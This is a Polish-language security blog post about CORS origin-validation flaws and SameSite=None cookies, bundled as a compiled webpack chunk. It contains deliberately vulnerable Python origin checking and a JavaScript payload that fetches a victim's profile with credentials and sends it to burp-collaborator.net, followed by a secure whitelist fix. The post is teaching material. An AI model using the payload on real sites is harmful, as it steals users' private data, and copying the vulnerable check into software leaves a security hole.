"use strict";(self.webpackChunkmy_page=self.webpackChunkmy_page||[]).push([[33602],{4395:(e,a,i)=>{i.r(a),i.d(a,{assets:()=>c,contentTitle:()=>s,default:()=>p,frontMatter:()=>o,metadata:()=>n,toc:()=>l});var n=i(11948),r=i(74848),t=i(28453);const o={slug:"cors-cross-origin-resource-sharing-2026",title:"CORS (Cross-Origin Resource Sharing) w 2026 roku \u2013 wy\u0142omy i tarcza SameSite",authors:["przemyslvw"],tags:["web-security","cors","samesite","owasp","vulnerabilities"],date:"2026-02-13"},s=void 0,c={authorsImageUrls:[void 0]},l=[];function d(e){const a={code:"code",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(a.p,{children:"CORS to mechanizm oparty na nag\u0142\xf3wkach HTTP, kt\xf3ry pozwala serwerowi zadeklarowa\u0107, czy skrypt z innej domeny mo\u017ce legalnie odczyta\u0107 jego odpowied\u017a, obchodz\u0105c restrykcje SOP (Same-Origin Policy). W 2026 roku sam b\u0142\u0119dny nag\u0142\xf3wek CORS nie wystarczy do przej\u0119cia sesji, poniewa\u017c nowoczesne przegl\u0105darki domy\u015blnie ucinaj\u0105 ciasteczka w \u017c\u0105daniach cross-site za spraw\u0105 mechanizmu SameSite=Lax. Jakie s\u0105 wi\u0119c realne zagro\u017cenia i jak si\u0119 przed nimi broni\u0107?"}),"\n",(0,r.jsxs)(a.p,{children:["Skuteczny atak kradzie\u017cy danych uwierzytelnionych wymaga specyficznego warunku: kombinacji podatnej walidacji nag\u0142\xf3wka Origin po stronie backendu oraz faktu, \u017ce aplikacja (np. ze wzgl\u0119du na architektur\u0119 SSO) jawnie przypisa\u0142a swoim ciasteczkom atrybut ",(0,r.jsx)(a.code,{children:"SameSite=None; Secure"}),"."]}),"\n",(0,r.jsx)(a.p,{children:(0,r.jsx)(a.strong,{children:"Scenariusz z \u017cycia (Vulnerable Code)"})}),"\n",(0,r.jsx)(a.p,{children:"Deweloper buduje API w Pythonie i pr\xf3buje obs\u0142u\u017cy\u0107 wiele subdomen za pomoc\u0105 elastycznego (i niebezpiecznego) sprawdzania ci\u0105gu znak\xf3w, podczas gdy aplikacja wykorzystuje globalne ciasteczka sesyjne omijaj\u0105ce restrykcje przegl\u0105darki."}),"\n",(0,r.jsx)(a.pre,{children:(0,r.jsx)(a.code,{className:"language-python",children:"# API Endpoint - Podatna walidacja Originu (ciastka maj\u0105 SameSite=None)\norigin = request.headers.get('Origin', '')\n# Podatno\u015b\u0107: operator \"in\" ufa ka\u017cdej domenie zawieraj\u0105cej \"target.com\"\nif \"target.com\" in origin:\n    response.headers['Access-Control-Allow-Origin'] = origin\n    response.headers['Access-Control-Allow-Credentials'] = 'true'\n    return jsonify(sensitive_user_data)\n"})}),"\n",(0,r.jsx)(a.p,{children:(0,r.jsx)(a.strong,{children:"Exploit (Jak to hakujemy)"})}),"\n",(0,r.jsxs)(a.ol,{children:["\n",(0,r.jsxs)(a.li,{children:["Analizuj\u0105c ruch, weryfikuj\u0119, \u017ce ciasteczko sesyjne ofiary posiada flag\u0119 ",(0,r.jsx)(a.code,{children:"SameSite=None; Secure"})," (co daje mi zielone \u015bwiat\u0142o od przegl\u0105darki na ataki cross-site)."]}),"\n",(0,r.jsxs)(a.li,{children:["Rejestruj\u0119 z\u0142o\u015bliw\u0105 domen\u0119 omijaj\u0105c\u0105 prymitywny filtr backendu, np. ",(0,r.jsx)(a.code,{children:"https://target.com.attacker.com"}),' (ci\u0105g znak\xf3w zawiera "target.com").']}),"\n",(0,r.jsxs)(a.li,{children:["Na mojej domenie hostuj\u0119 payload: ",(0,r.jsx)(a.code,{children:"<script>fetch('https://api.target.com/profile', {credentials: 'include'}).then(r => r.text()).then(d => fetch('https://burp-collaborator.net/?d=' + btoa(d)));<\/script>"}),"."]}),"\n",(0,r.jsxs)(a.li,{children:["Wysy\u0142am link zalogowanej ofierze. Przegl\u0105darka widzi ",(0,r.jsx)(a.code,{children:"SameSite=None"})," i do\u0142\u0105cza ciastko do \u017c\u0105dania, podatny backend akceptuje m\xf3j Origin, a wra\u017cliwy JSON z odpowiedzi trafia prosto do log\xf3w w Burp Suite."]}),"\n"]}),"\n",(0,r.jsx)(a.p,{children:(0,r.jsx)(a.strong,{children:"Secure Code (Jak to naprawi\u0107)"})}),"\n",(0,r.jsxs)(a.p,{children:["Je\u015bli musimy u\u017cywa\u0107 ",(0,r.jsx)(a.code,{children:"SameSite=None"}),", ci\u0119\u017car obrony ca\u0142kowicie spada na backend. Nale\u017cy zrezygnowa\u0107 z wyra\u017ce\u0144 regularnych czy metod typu contains na rzecz \u015bcis\u0142ej, rygorystycznej bia\u0142ej listy (Whitelist)."]}),"\n",(0,r.jsx)(a.pre,{children:(0,r.jsx)(a.code,{className:"language-python",children:"# API Endpoint - Bezpieczna walidacja (Strict Whitelist)\nALLOWED_ORIGINS = {\"https://app.target.com\", \"https://dev.target.com\"}\norigin = request.headers.get('Origin', '')\n# Zabezpieczenie: Sprawdzamy absolutne dopasowanie 1:1 w zaufanym zbiorze\nif origin in ALLOWED_ORIGINS:\n    response.headers['Access-Control-Allow-Origin'] = origin\n    response.headers['Access-Control-Allow-Credentials'] = 'true'\n    return jsonify(sensitive_user_data)\n"})}),"\n",(0,r.jsx)(a.hr,{})]})}function p(e={}){const{wrapper:a}={...(0,t.R)(),...e.components};return a?(0,r.jsx)(a,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},11948:e=>{e.exports=JSON.parse('{"permalink":"/blog/cors-cross-origin-resource-sharing-2026","editUrl":"https://github.com/przemyslvw/my-page/edit/master/blog/2026-02-13/index.md","source":"@site/blog/2026-02-13/index.md","title":"CORS (Cross-Origin Resource Sharing) w 2026 roku \u2013 wy\u0142omy i tarcza SameSite","description":"CORS to mechanizm oparty na nag\u0142\xf3wkach HTTP, kt\xf3ry pozwala serwerowi zadeklarowa\u0107, czy skrypt z innej domeny mo\u017ce legalnie odczyta\u0107 jego odpowied\u017a, obchodz\u0105c restrykcje SOP (Same-Origin Policy). W 2026 roku sam b\u0142\u0119dny nag\u0142\xf3wek CORS nie wystarczy do przej\u0119cia sesji, poniewa\u017c nowoczesne przegl\u0105darki domy\u015blnie ucinaj\u0105 ciasteczka w \u017c\u0105daniach cross-site za spraw\u0105 mechanizmu SameSite=Lax. Jakie s\u0105 wi\u0119c realne zagro\u017cenia i jak si\u0119 przed nimi broni\u0107?","date":"2026-02-13T00:00:00.000Z","tags":[{"inline":false,"label":"Web Security","permalink":"/blog/tags/web-security","description":"Praktyki, narz\u0119dzia i techniki zabezpieczania aplikacji webowych."},{"inline":false,"label":"CORS","permalink":"/blog/tags/cors","description":"Cross-Origin Resource Sharing i powi\u0105zane zagadnienia, weryfikacja Origin."},{"inline":false,"label":"SameSite","permalink":"/blog/tags/samesite","description":"Mechanizm atrybutu SameSite dla ciasteczek (Lax, Strict, None) i zabezpieczenia."},{"inline":false,"label":"OWASP","permalink":"/blog/tags/owasp","description":"Open Web Application Security Project i jego wytyczne."},{"inline":false,"label":"Vulnerabilities","permalink":"/blog/tags/vulnerabilities","description":"Luki bezpiecze\u0144stwa i raporty o podatno\u015bciach."}],"readingTime":1.62,"hasTruncateMarker":true,"authors":[{"name":"Przemys\u0142aw Majdak","title":"Full-Stack Developer, Automation Engineer & Web Security Specialist","url":"https://www.majdak.online","bio":"In\u017cynier aplikacji internetowych, specjalista ds. automatyzacji test\xf3w i bezpiecze\u0144stwa IT.","socials":{"github":"https://github.com/przemyslvw","instagram":"https://www.instagram.com/przemas.ts","x":"https://x.com/przemyslvw","garmin":"https://connect.garmin.com/modern/profile/396bbbd1-edbd-4fd4-a780-132723eef739"},"imageURL":"https://avatars.githubusercontent.com/u/31745530?v=4","key":"przemyslvw","page":null}],"frontMatter":{"slug":"cors-cross-origin-resource-sharing-2026","title":"CORS (Cross-Origin Resource Sharing) w 2026 roku \u2013 wy\u0142omy i tarcza SameSite","authors":["przemyslvw"],"tags":["web-security","cors","samesite","owasp","vulnerabilities"],"date":"2026-02-13"},"unlisted":false,"prevItem":{"title":"Ewolucja HTTP (1.1 vs 2.0 vs 3.0) \u2013 Od czystego tekstu do zaszyfrowanych dron\xf3w","permalink":"/blog/http-evolution-2026"},"nextItem":{"title":"Jak zhakowa\u0107 w\u0142asn\u0105 aplikacj\u0119? Kompletna checklista bezpiecze\u0144stwa dla API i SPA","permalink":"/blog/jak-zhakowac-wlasna-aplikacje"}}')},28453:(e,a,i)=>{i.d(a,{R:()=>o,x:()=>s});var n=i(96540);const r={},t=n.createContext(r);function o(e){const a=n.useContext(t);return n.useMemo((function(){return"function"==typeof e?e(a):{...a,...e}}),[a,e])}function s(e){let a;return a=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),n.createElement(t.Provider,{value:a},e.children)}}}]);